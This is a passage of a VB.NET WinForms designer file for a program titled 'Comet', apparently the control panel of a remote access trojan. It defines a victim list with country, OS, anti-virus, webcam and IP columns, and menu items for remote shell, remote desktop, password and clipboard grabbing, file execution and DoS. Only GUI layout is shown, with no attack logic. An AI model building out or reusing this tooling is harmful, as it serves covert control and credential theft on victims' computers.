        Me.ColumnHeader17.Width = 140
        '
        'ColumnHeader18
        '
        Me.ColumnHeader18.Text = "Country"
        Me.ColumnHeader18.Width = 110
        '
        'ColumnHeader19
        '
        Me.ColumnHeader19.Text = "OS"
        Me.ColumnHeader19.Width = 250
        '
        'ColumnHeader20
        '
        Me.ColumnHeader20.Text = "Anti Virus"
        Me.ColumnHeader20.Width = 90
        '
        'ColumnHeader21
        '
        Me.ColumnHeader21.Text = "Acitve Windows"
        Me.ColumnHeader21.Width = 270
        '
        'ColumnHeader22
        '
        Me.ColumnHeader22.Text = "CAM"
        Me.ColumnHeader22.Width = 50
        '
        'ColumnHeader23
        '
        Me.ColumnHeader23.Text = "RAM"
        Me.ColumnHeader23.Width = 50
        '
        'ColumnHeader24
        '
        Me.ColumnHeader24.Text = "CPU"
        Me.ColumnHeader24.Width = 250
        '
        'ColumnHeader25
        '
        Me.ColumnHeader25.Text = "Ver"
        Me.ColumnHeader25.Width = 50
        '
        'ColumnHeader26
        '
        Me.ColumnHeader26.Text = "Install Date"
        Me.ColumnHeader26.Width = 90
        '
        'ColumnHeader27
        '
        Me.ColumnHeader27.Text = "company"
        Me.ColumnHeader27.Width = 90
        '
        'ColumnHeader28
        '
        Me.ColumnHeader28.Text = "Internal IP"
        Me.ColumnHeader28.Width = 78
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Charging"
        Me.ColumnHeader1.Width = 67
        '
        'SplitContainer3
        '
        Me.SplitContainer3.BackColor = System.Drawing.SystemColors.ControlDark
        Me.SplitContainer3.Dock = System.Windows.Forms.DockStyle.Fill
        Me.SplitContainer3.Location = New System.Drawing.Point(0, 0)
        Me.SplitContainer3.Name = "SplitContainer3"
        '
        'SplitContainer3.Panel1
        '
        Me.SplitContainer3.Panel1.BackColor = System.Drawing.Color.Black
        Me.SplitContainer3.Panel1.Controls.Add(Me.PictureBox1)
        '
        'SplitContainer3.Panel2
        '
        Me.SplitContainer3.Panel2.BackColor = System.Drawing.SystemColors.Control
        Me.SplitContainer3.Panel2.Controls.Add(Me.GClass91)
        Me.SplitContainer3.Size = New System.Drawing.Size(838, 135)
        Me.SplitContainer3.SplitterDistance = 162
        Me.SplitContainer3.TabIndex = 0
        '
        'PictureBox1
        '
        Me.PictureBox1.BackColor = System.Drawing.Color.Gainsboro
        Me.PictureBox1.Cursor = System.Windows.Forms.Cursors.Default
        Me.PictureBox1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.PictureBox1.ErrorImage = CType(resources.GetObject("PictureBox1.ErrorImage"), System.Drawing.Image)
        Me.PictureBox1.InitialImage = CType(resources.GetObject("PictureBox1.InitialImage"), System.Drawing.Image)
        Me.PictureBox1.Location = New System.Drawing.Point(0, 0)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(162, 135)
        Me.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox1.TabIndex = 1
        Me.PictureBox1.TabStop = False
        '
        'GClass91
        '
        Me.GClass91.BackColor = System.Drawing.Color.Gainsboro
        Me.GClass91.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.GClass91.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader3})
        Me.GClass91.Dock = System.Windows.Forms.DockStyle.Fill
        Me.GClass91.Font = New System.Drawing.Font("Arial", 8.0!, System.Drawing.FontStyle.Bold)
        Me.GClass91.ForeColor = System.Drawing.Color.Black
        Me.GClass91.FullRowSelect = True
        Me.GClass91.HeaderStyle = System.Windows.Forms.ColumnHeaderStyle.None
        Me.GClass91.Location = New System.Drawing.Point(0, 0)
        Me.GClass91.Name = "GClass91"
        Me.GClass91.OwnerDraw = True
        Me.GClass91.Size = New System.Drawing.Size(672, 135)
        Me.GClass91.SmallImageList = Me.ImageList2
        Me.GClass91.TabIndex = 0
        Me.GClass91.UseCompatibleStateImageBehavior = False
        Me.GClass91.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader3
        '
        Me.ColumnHeader3.Text = "logs"
        Me.ColumnHeader3.Width = 672
        '
        'ImageList2
        '
        Me.ImageList2.ImageStream = CType(resources.GetObject("ImageList2.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageList2.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageList2.Images.SetKeyName(0, "4erwfgasdfvwer3wesd.png")
        Me.ImageList2.Images.SetKeyName(1, "qweqwde3.png")
        '
        'ColumnHeader2
        '
        Me.ColumnHeader2.Width = 144
        '
        'gg
        '
        '
        'Timer4
        '
        Me.Timer4.Enabled = True
        '
        'Timer5
        '
        Me.Timer5.Enabled = True
        Me.Timer5.Interval = 1000
        '
        'ToolTip1
        '
        Me.ToolTip1.ForeColor = System.Drawing.Color.Black
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.White
        Me.ClientSize = New System.Drawing.Size(838, 415)
        Me.Controls.Add(Me.Panel1)
        Me.Controls.Add(Me.c1)
        Me.Controls.Add(Me.c2)
        Me.Controls.Add(Me.c)
        Me.Controls.Add(Me.CheckBox1)
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.Name = "Form1"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterParent
        Me.Text = "Comet  "
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
        CType(Me.c, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ContextMenuStrip1.ResumeLayout(False)
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.Panel1.ResumeLayout(False)
        Me.Panel1.PerformLayout()
        CType(Me.PictureBox3, System.ComponentModel.ISupportInitialize).EndInit()
        CType(Me.PictureBox2, System.ComponentModel.ISupportInitialize).EndInit()
        Me.SplitContainer2.Panel1.ResumeLayout(False)
        Me.SplitContainer2.Panel2.ResumeLayout(False)
        Me.SplitContainer2.ResumeLayout(False)
        Me.VisualStudioTabControl2.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.Panel4.ResumeLayout(False)
        Me.Panel4.PerformLayout()
        Me.SplitContainer3.Panel1.ResumeLayout(False)
        Me.SplitContainer3.Panel2.ResumeLayout(False)
        Me.SplitContainer3.ResumeLayout(False)
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub
    Friend WithEvents CheckBox1 As System.Windows.Forms.CheckBox
    Friend WithEvents c1 As System.Windows.Forms.ComboBox
    Friend WithEvents c2 As System.Windows.Forms.ComboBox
    Friend WithEvents c As System.Windows.Forms.NumericUpDown
    Friend WithEvents ContextMenuStrip1 As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents RunFileToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromDiskToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FromLinkToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ControlPanelToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents JToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteDesktopToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RemoteShellToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ProcessManagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ExtrasToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents InformationToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CopyIPToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents OpenWebSiteToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RegeditToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GetPasswordsToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GetClipBoardToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StartProcessToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ServerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RenameToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NotifyIcon1 As System.Windows.Forms.NotifyIcon
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents Timer2 As System.Windows.Forms.Timer
    Friend WithEvents Timer3 As System.Windows.Forms.Timer
    Friend WithEvents StatusStrip1 As StatusStrip
    Friend WithEvents ToolStripSeparator1 As ToolStripSeparator
    Friend WithEvents ToolStripSeparator2 As ToolStripSeparator
    Friend WithEvents ToolStripStatusLabel3 As ToolStripStatusLabel
    Friend WithEvents ProgressBar1 As ProgressBar
    Friend WithEvents PictureBox1 As PictureBox
    Friend WithEvents SplitContainer2 As SplitContainer
    Friend WithEvents SplitContainer3 As SplitContainer
    Friend WithEvents Panel1 As Panel
    Friend WithEvents gg As System.Windows.Forms.Timer
    Friend WithEvents OpenDownloadFolderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents Timer4 As System.Windows.Forms.Timer
    Friend WithEvents SdfdsfgdfToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CommentsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TETEToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ChToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KloToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DosToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CLXToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripStatusLabel1 As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents Timer5 As System.Windows.Forms.Timer
    Friend WithEvents RecToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ComputerRestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ComputerShutdownToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents LogOutComputerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolTip1 As System.Windows.Forms.ToolTip
    Friend WithEvents StillnessToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
    Friend WithEvents PictureBox3 As System.Windows.Forms.PictureBox
    Friend WithEvents ColumnHeader2 As System.Windows.Forms.ColumnHeader
    Friend WithEvents GClass91 As comet.GClass9
    Friend WithEvents ColumnHeader3 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ImageList2 As System.Windows.Forms.ImageList
    Friend WithEvents ServersToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GOkaToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ActiveWindowsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents VisualStudioTabControl2 As comet.VisualStudioTabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents Panel4 As System.Windows.Forms.Panel
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents CheckBox2 As System.Windows.Forms.CheckBox
    Friend WithEvents L1 As comet.GClass9
    Friend WithEvents ColumnHeader15 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader16 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader17 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader18 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader19 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader20 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader21 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader22 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader23 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader24 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader25 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader26 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader27 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader28 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeader1 As System.Windows.Forms.ColumnHeader
    Friend WithEvents ii As System.Windows.Forms.ImageList
    Friend WithEvents hard As System.Windows.Forms.TextBox

End Class
